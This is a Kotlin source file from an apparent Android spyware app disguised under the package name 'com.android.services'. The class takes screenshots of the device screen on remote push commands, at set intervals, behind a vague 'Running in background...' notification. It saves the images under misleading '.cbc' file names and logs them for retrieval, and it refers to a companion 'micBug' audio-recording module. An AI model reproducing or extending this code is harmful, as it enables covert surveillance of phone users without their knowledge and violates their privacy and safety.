package com.android.services.services.screenshot

import android.app.Activity
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Point
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.DisplayMetrics
import android.view.OrientationEventListener
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.core.app.NotificationCompat
import com.android.services.R
import com.android.services.db.entities.ScreenShot
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.receiver.NotificationBroadcastReceiver
import com.android.services.services.RemoteDataService
import com.android.services.services.micBug.MicBugCommandProcessingBaseI
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.FileOutputStream
import java.io.IOException
import java.util.*

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class ScreenShotCommandProcessingImplI(
    val service: Service,
    val localDatabaseSource: LocalDatabaseSource,
    val coroutineScope: CoroutineScope,
) : ScreenShotCommandProcessingBaseI(service) {
    override fun initialize() {
        val notificationIntent =
            Intent(service.applicationContext, NotificationBroadcastReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            service.applicationContext,
            SCREEN_SHOT_NOTIFICATION_ID,
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notification =
            NotificationCompat.Builder(service.applicationContext, RemoteDataService.CHANNEL_ID)
                .setContentText("Running in background...")
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentIntent(pendingIntent)
                .build()
        service.startForeground(SCREEN_SHOT_NOTIFICATION_ID, notification)

        mProjectionManager =
            service.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        val mWindowManager = service.getSystemService(Context.WINDOW_SERVICE) as WindowManager?
        val metrics = DisplayMetrics()
        mWindowManager?.let {
            mDisplay = mWindowManager.defaultDisplay
            mDisplay?.getMetrics(metrics)
            mDensity = metrics.densityDpi
        }
        logVerbose("${AppConstants.SCREEN_SHOT_TYPE} In OnInitialize()")
    }

    override fun parseIntent(intent: Intent) {
        screenShotCommand = intent.getParcelableExtra(SCREEN_SHOT_PUSH)
        screenShotCommand?.let {
            screenShotPushId = it.pushId
            noOfScreenShots = it.customData.toInt()
            screenShotInterval = it.intervalOption!!.toLong().times(1000)
        }
        screenShotGroup = AppUtils.formatDateCustom(System.currentTimeMillis().toString())
        startScreenShotCapturingTask()
        logVerbose("${AppConstants.SCREEN_SHOT_TYPE} screenShotCommand = $screenShotCommand")
    }

    private fun startScreenShotCapturingTask() {
        if (mScreenShotTimer != null) {
            mScreenShotTimer!!.cancel()
            mScreenShotTimer!!.purge()
            mScreenShotTimer = null
        }
        mScreenShotTimer = Timer()
        mScreenShotTimer!!.scheduleAtFixedRate(ScreenShotCapturingTask(), 0L, screenShotInterval)
    }

    private fun stopScreenShotTimerTask() {
        if (mScreenShotTimer != null) {
            mScreenShotTimer!!.cancel()
            mScreenShotTimer!!.purge()
            mScreenShotTimer = null
        }
    }

    private inner class ScreenShotCapturingTask : TimerTask() {
        override fun run() {
            if (screenShotCounter < noOfScreenShots) {
                if (AppUtils.isScreenInteractive(applicationContext)) {
                    coroutineScope.launch {
                        try {
                            captureScreenShot()
                        } catch (exception: Exception) {
                            logVerbose("${AppConstants.SCREEN_SHOT_TYPE} capturing exception: ${exception.message}")
                            updateScreenShotPushAsCorrupted()
                        }
                    }
                } else {
                    logVerbose("${AppConstants.SCREEN_SHOT_TYPE} screenshot missed, screen is not interactive")
                }
                screenShotCounter += 1
                logVerbose("${AppConstants.SCREEN_SHOT_TYPE} screenshot counter = $screenShotCounter")
            } else {
                stopThisService()
            }
        }
    }

    private fun stopThisService() {
        logVerbose("${TAG}stopping screenshots with counter = $screenShotCounter")
        releaseResources()
        service.stopSelf()
    }

    @Throws(Exception::class)
    private suspend fun captureScreenShot() {
        withContext(Dispatchers.IO) {
            mMediaProjection = AppConstants.screenRecordingIntent?.let {
                mProjectionManager!!.getMediaProjection(
                    Activity.RESULT_OK,
                    it
                )
            }
            mMediaProjection!!.registerCallback(MediaProjectionStopCallback(), mHandler)
            mOrientationChangeCallback = OrientationChangeCallback(applicationContext)
            if (mOrientationChangeCallback!!.canDetectOrientation()) {
                mOrientationChangeCallback!!.enable()
            }
            createVirtualDisplay()
        }
    }

    private fun createVirtualDisplay() {
        val size = Point()
        mDisplay!!.getSize(size)
        mWidth = size.x
        mHeight = size.y
        mImageReader = ImageReader.newInstance(
            mWidth,
            mHeight,
            PixelFormat.RGBA_8888,
            1
        )
        mImageReader!!.setOnImageAvailableListener(
            ImageAvailableListener(),
            mHandler
        )
        mVirtualDisplay = mMediaProjection!!.createVirtualDisplay(
            SCREEN_CAPTURE_NAME,
            mWidth,
            mHeight,
            mDensity,
            VIRTUAL_DISPLAY_FLAGS,
            mImageReader!!.surface,
            null,
            mHandler
        )
    }

    private inner class ImageAvailableListener : ImageReader.OnImageAvailableListener {
        override fun onImageAvailable(reader: ImageReader) {
            logVerbose(
                "${AppConstants.SCREEN_SHOT_TYPE} On Image Available " + AppUtils.formatDate(
                    System.currentTimeMillis().toString()
                )
            )
            try {
                logVerbose("${AppConstants.SCREEN_SHOT_TYPE} starting Writing Image Task = $screenShotCounter")
                releaseResources()
                coroutineScope.launch {
                    writeScreenShotToDisk(reader)
                    logVerbose("${AppConstants.SCREEN_SHOT_TYPE} screenShot saved to disk = $screenShotCounter")
                    saveScreenShot()
                    logVerbose("${AppConstants.SCREEN_SHOT_TYPE} screenShot saved to db = $screenShotCounter")
                }
            } catch (e: Exception) {
                logException("${AppConstants.SCREEN_SHOT_TYPE} OnImageAvailable Error: " + e.message)
                updateScreenShotPushAsCorrupted()
            }
        }
    }

    private fun releaseResources() {
        releaseVirtualDisplay()
        stopProjection()
        resetImageReaderListener()
        disableOrientationChangeCallback()
    }

    private suspend fun writeScreenShotToDisk(imageReader: ImageReader) {
        withContext(Dispatchers.IO) {
            var image: Image? = null
            var fos: FileOutputStream? = null
            var bitmap: Bitmap? = null
            val imageName = System.currentTimeMillis().toString()
            try {
                image = imageReader.acquireLatestImage()
                if (image != null) {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding: Int =
                        rowStride - pixelStride * mWidth
                    bitmap = Bitmap.createBitmap(
                        mWidth + rowPadding / pixelStride,
                        mHeight,
                        Bitmap.Config.ARGB_8888
                    )
                    bitmap.copyPixelsFromBuffer(buffer)
                    filePath =
                        createOutputFilePath(imageName + "_" + screenShotCounter + "_decrypt.cbc")
                    fos = FileOutputStream(filePath)
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 20, fos)
                    logVerbose("${AppConstants.SCREEN_SHOT_TYPE} Image saved: $imageName")
                }
            } catch (e: Exception) {
                logException("${AppConstants.SCREEN_SHOT_TYPE} Writing screenshot Error: " + e.message)
                updateScreenShotPushAsCorrupted()
            } finally {
                if (fos != null) {
                    try {
                        fos.close()
                    } catch (ioe: IOException) {
                        ioe.printStackTrace()
                    }
                }
                bitmap?.recycle()
                image?.close()
            }
        }
    }

    private inner class MediaProjectionStopCallback : MediaProjection.Callback() {
        override fun onStop() {
            releaseVirtualDisplay()
            resetImageReaderListener()
            disableOrientationChangeCallback()
            mMediaProjection!!.unregisterCallback(this@MediaProjectionStopCallback)
        }
    }

    private fun releaseVirtualDisplay() {
        if (mVirtualDisplay != null) {
            mVirtualDisplay!!.release()
            mVirtualDisplay = null
        }
    }

    private fun resetImageReaderListener() {
        if (mImageReader != null) {
            mImageReader!!.setOnImageAvailableListener(null, null)
            mImageReader = null
        }
    }

    private fun disableOrientationChangeCallback() {
        if (mOrientationChangeCallback != null) {
            mOrientationChangeCallback!!.disable()
            mOrientationChangeCallback = null
        }
    }

    private fun stopProjection() {
        mHandler.post {
            if (mMediaProjection != null) {
                mMediaProjection!!.stop()
            }
        }
    }

    inner class OrientationChangeCallback constructor(context: Context?) :
        OrientationEventListener(context) {
        override fun onOrientationChanged(orientation: Int) {
            val rotation: Int = mDisplay!!.rotation
            if (rotation != mRotation) {
                mRotation = rotation
                try {
                    releaseVirtualDisplay()
                    resetImageReaderListener()
                    createVirtualDisplay()
                } catch (e: Exception) {
                    logException("${AppConstants.SCREEN_SHOT_TYPE} OrientationChangeCallback Error: " + e.message)
                    updateScreenShotPushAsCorrupted()
                }
            }
        }
    }

    @Throws(Exception::class)
    private suspend fun saveScreenShot() {
        withContext(Dispatchers.IO) {
            try {
                val screenShot = ScreenShot()
                screenShot.apply {
                    file = filePath!!
                    name = "${screenShotGroup}_${noOfScreenShots}"
                    dateTaken = AppUtils.formatDate(System.currentTimeMillis().toString())
                    this.pushId = screenShotPushId
                    pushStatus = "2"
                    date = AppUtils.getDate(System.currentTimeMillis())
                    status = 0
                }
                localDatabaseSource.insertScreenShot(screenShot)
                capturedScreenShots += 1
                logVerbose("captured screenshots count = $capturedScreenShots")

                if (screenShotCounter == noOfScreenShots) {
                    stopThisService()
                }
            } catch (exception: Exception) {
                logException("Error saving screenshot = ${exception.message}")
                updateScreenShotPushAsCorrupted()
            }
        }
    }

    override fun createOutputFilePath(fileName: String): String {
        return AppUtils.retrieveFilePath(
            applicationContext,
            AppConstants.DIR_SCREEN_SHOT,
            fileName
        )
    }

    override fun onServiceDestroy() {
        stopScreenShotTimerTask()
    }

    /**
     * Updates the Screenshot push as corrupted
     */
    private fun updateScreenShotPushAsCorrupted() {
        if (capturedScreenShots > 0) {
            MicBugCommandProcessingBaseI.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
        } else {
            MicBugCommandProcessingBaseI.micBugStatus = FcmPushStatus.FILE_CORRUPTED.getStatus()
        }
        coroutineScope.launch {
            withContext(Dispatchers.IO) {
                localDatabaseSource.updatePushStatus(
                    screenShotPushId,
                    FcmPushStatus.FILE_CORRUPTED.getStatus(),
                    0
                )
                if (filePath != null && filePath!!.isNotEmpty())
                    AppUtils.deleteFile(applicationContext, filePath!!)
            }
        }
        service.stopSelf()
    }
}